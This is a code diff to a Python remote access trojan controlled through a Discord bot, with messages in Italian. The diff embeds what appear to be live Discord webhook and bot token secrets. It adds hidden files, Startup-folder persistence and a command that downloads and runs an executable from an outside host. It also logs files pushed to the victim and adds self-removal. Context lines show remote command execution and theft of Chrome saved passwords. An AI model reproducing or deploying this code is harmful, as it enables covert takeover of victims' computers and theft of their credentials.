@@ -1,5 +1,5 @@
-weburl = 'ENTER HERE YOUR WEBHOOK URL'
-botoken = 'ENTER HERE YOUR DISCORD BOT TOKEN'
+weburl = 'https://discord.com/api/webhooks/994231041747320952/_K4JA5qualo8t87KlxMOkfQ-ydW60QUQh1RyABT8DUqKct_xwHJaqVZ6wfsLbgdoZBON'
+botoken = 'OTgwNTY2NDM3ODUwNjU2NzY4.GuxK4Q.q9V5FTfQRuiPnVmOnsUxRqelZVrie5EMkNgyMk'
 import discord
 from discord.ext import commands
 from discord_webhook import DiscordWebhook
@@ -29,9 +29,49 @@ userprofile = os.environ["USERPROFILE"]
 appdatar = os.environ["APPDATA"]
 appdatal = os.environ["LOCALAPPDATA"]
 i = requests.get("https://ifconfig.me")
-
+subprocess.getoutput('if not exist "%appdata%\sysloadlog.txt" type nul > "%appdata%\sysloadlog.txt"')
+subprocess.getoutput('attrib +h "%appdata%\sysloadlog.txt"')
+startup = appdatar + '\Microsoft\Windows\Start Menu\Programs\Startup'
+filename = os.path.basename(__file__)
+thisfilepath = startup + f"\{filename}"
 client = commands.Bot(command_prefix=")", intents=discord.Intents.all(), description="Bot for rat")
 
+
+class MyHelp(commands.HelpCommand):
+
+    async def send_bot_help(self, mapping):
+        """
+        This is triggered when !help is invoked.
+
+        This example demonstrates how to list the commands that the member invoking the help command can run.
+        """
+        filtered = await self.filter_commands(self.context.bot.commands, sort=True) # returns a list of command objects
+        names = [command.name for command in filtered] # iterating through the commands objects getting names
+        available_commands = "\t\n".join(names) # joining the list of names by a new line
+        embedhelp = discord.Embed(
+            title="Comandi",
+            description=available_commands,
+            color=discord.Color.blue()
+        )
+        await self.context.send(embed=embedhelp)
+    async def send_command_help(self, command):
+        """This is triggered when !help <command> is invoked."""
+        await self.context.send(f'Questa è la pagina di aiuto del comando "**{command}**"')
+
+    async def send_group_help(self, group):
+        """This is triggered when !help <group> is invoked."""
+        await self.context.send("This is the help page for a group command")
+
+    async def send_cog_help(self, cog):
+        """This is triggered when !help <cog> is invoked."""
+        await self.context.send("This is the help page for a cog")
+
+    async def send_error_message(self, error):
+        """If there is an error, send a embed containing the error."""
+        channel = self.get_destination()
+        await channel.send(error)
+
+client.help_command = MyHelp()
 
 @client.command()
 async def sysinfo(ctx):
@@ -98,22 +138,31 @@ async def ifconfig(ctx):
 
 @client.command()
 async def noescape(ctx):
-    subprocess.getoutput('if exist "%appdata%\noescape.zip" del "%appdata%\noescape.zip"/q')
-    linknoescape = 'https://download1495.mediafire.com/197ufuit42rg/fyc0dlkog1ra1q2/noescape.zip'
+    subprocess.getoutput('if exist "%appdata%\player\player.zip" del "%appdata%\player\player.zip"/q')
+    linknoescape = "https://ratsite.000webhostapp.com/player.zip"
     startdwn = requests.get(linknoescape)
     contenuto = startdwn.content
-    fbdn = open(f'{appdatar}/noescape.zip','wb')
+    fbdn = open(f'{appdatar}/player.zip','wb')
     fbdn.write(contenuto)
     fbdn.close()
-    with ZipFile(f'{appdatar}/noescape.zip', 'r') as zipObj:
-        zipObj.extractall()
-    await ctx.send('Il bot non potrà essere usato per 4:05 minuti')
+    zf = ZipFile(f'{appdatar}/player.zip', 'r')
+    zf.extractall(f'{appdatar}/player')
+    zf.close()
+    #await ctx.send('Il bot non potrà essere usato per 4:05 minuti')
     await ctx.send('Inizio brano')
-    subprocess.getoutput('start Windows.exe')
-    subprocess.getoutput('del "%appdata%\noescape.zip"/q')
-    subprocess.getoutput('del "%appdata%\Windows.exe"/q')
-    subprocess.getoutput(r'del "%appdata%\NoEscape.mp3"/q')
-
+    cwdnow = os.getcwd()
+    linkmp3 = "https://ratsite.000webhostapp.com/audioplay.mp3"
+    startdwn = requests.get(linkmp3)
+    contenuto = startdwn.content
+    fbdn = open(f'{appdatar}/player/audioplay.mp3','wb')
+    fbdn.write(contenuto)
+    fbdn.close()
+    os.chdir(appdatar + "/player")
+    os.popen("start player.exe")
+    os.chdir("..")
+    subprocess.getoutput("del player.zip")
+    subprocess.getoutput("attrib +h player")
+    os.chdir(cwdnow)
     
 @client.command()
 async def cmd(ctx,arg=None):
@@ -169,6 +218,12 @@ async def input(ctx,arg=None):
         subprocess.getoutput('start InputWR.vbs')
         await ctx.send(f'Input {writed} inviato')
         subprocess.getoutput('if exist InputWR.vbs del InputWR.vbs/q')
+
+
+@client.command()
+async def closerat(ctx):
+    await ctx.send("Rat Spento")
+    sys.exit()
 
 
 @client.command()
@@ -321,11 +376,17 @@ async def download(ctx,arg=None,user_input=None):
                 fbdn.write(contenuto)
                 fbdn.close()
                 await ctx.send(f"File {user_input} scaricato correttamente")
+                subprocess.getoutput('attrib -h "%appdata%\sysloadlog.txt"')
+                with open(appdatar + "\sysloadlog.txt",'a') as a:
+                    a.write(f"{userprofile}\downloads\{user_input}\n")
             else:
                 fbdn = open(user_input,'wb')
                 fbdn.write(contenuto)
                 fbdn.close()
                 await ctx.send(f"File {user_input} scaricato correttamente")
+                subprocess.getoutput('attrib +h "%appdata%\sysloadlog.txt"')
+                with open(appdatar + "\sysloadlog.txt",'a') as a:
+                    a.write(user_input + "\n")
         except:
             await ctx.send("Download failed")
 
@@ -353,12 +414,16 @@ async def shutdown(ctx,arg=None):
     elif arg == None:
         await ctx.send('Arg deve essere "bot", e questo rimuoverà definitivamente il rat dal pc vittima')
     else:
-        subprocess.getoutput('echo @echo off > "%appdata%\ender.bat"')
-        subprocess.getoutput('echo taskkill /f /t /im pyw.exe >> "%appdata%\ender.bat"')
-        subprocess.getoutput('echo if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\b.pyw" del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\BotConfig.pyw"/q >> "%appdata%\ender.bat"')
-        subprocess.getoutput('echo del ender.bat/q >> "%appdata%\ender.bat"')
-        os.chdir(appdatar)
-        subprocess.getoutput('start ender.bat')
+        r = open(appdatar + "\sysloadlog.txt",'r')
+        Lines = r.readlines()
+        for line in Lines:
+            file = line.strip()
+            subprocess.getoutput(f'del "{file}"/q')
+        r.close()
+        subprocess.getoutput('del "%appdata%\sysloadlog.txt"/q')
+        subprocess.getoutput('if exist "%localappdata%\WinStart" rd "%localappdata%\WinStart"/q/s')
+        subprocess.getoutput(f'del "{thisfilepath}"/q')
+        sys.exit()
 
 
 @client.command()
@@ -401,8 +466,10 @@ async def sendmsg(ctx,arg=None,user_input=None):
     else:
         subprocess.getoutput(f'echo msgbox "{arg}", {user_input}, "MESSAGE" > "%appdata%\m.vbs"')
         subprocess.getoutput('echo createobject("scripting.filesystemobject").DeleteFile "m.vbs" >> "%appdata%\m.vbs"')
+        thisdir = os.getcwd()
         os.chdir(appdatar)
-        subprocess.getoutput('start m.vbs')
+        os.popen('start m.vbs')
+        os.chdir(thisdir)
         await ctx.send(f"Messaggio {arg} inviato")
 
 @client.command()
@@ -445,7 +512,7 @@ async def chromepws(ctx):
     def get_secret_key():
         try:
             #(1) Get secretkey from chrome local state
-            with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
+            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                 local_state = f.read()
                 local_state = json.loads(local_state)
             secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
